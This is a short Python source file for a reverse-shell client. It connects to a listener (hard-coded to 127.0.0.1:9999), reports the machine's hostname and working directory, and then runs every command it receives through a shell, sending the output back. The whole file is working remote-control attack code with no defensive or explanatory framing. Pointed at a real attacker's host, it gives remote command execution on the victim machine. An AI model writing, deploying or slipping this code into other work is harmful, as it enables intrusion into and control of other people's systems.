import os
import socket
import subprocess


def start_connexion(ThisIP, ThisPort, ThisMSG):
    ThisSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ThisSocket.connect((ThisIP, ThisPort))
    ThisSocket.send(ThisMSG.encode('latin1'))
    return ThisSocket


if __name__ == '__main__':
    IP = '127.0.0.1'
    PORT = 9999
    hostname = str(socket.gethostname())
    currentDir = str(os.getcwd())
    sendThis = '\n[+] ' + hostname + ' Connected\nPath of ReverseShell : ' + currentDir + '\n\n' + currentDir + '>'

    currentSocket = start_connexion(IP, PORT, sendThis)
    while True:
        try:
            command = currentSocket.recv(1024).decode('latin1')
            if command and command == "exit":
                currentSocket.send("\n [-] " + hostname + " Connection closed")
                currentSocket.close()
                break
            elif command and command != "exit":
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if command[:2] == 'cd':
                    path = str(command[3:].replace('\n', ''))
                    if os.path.exists(path):
                        os.chdir(path)
                        stdout = process.stdout.read()
                    else:
                        stdout = bytes(("Path " + path + " not exist\n").encode('latin1'))
                else:
                    stdout = process.stdout.read() + process.stderr.read()
                args = stdout
                currentSocket.send(bytes((args.decode('latin1') + str(os.getcwd()) + '> ').encode('latin1')))

            else:
                currentSocket.send("\n Command error.")
        except:
            currentSocket.close()
            break
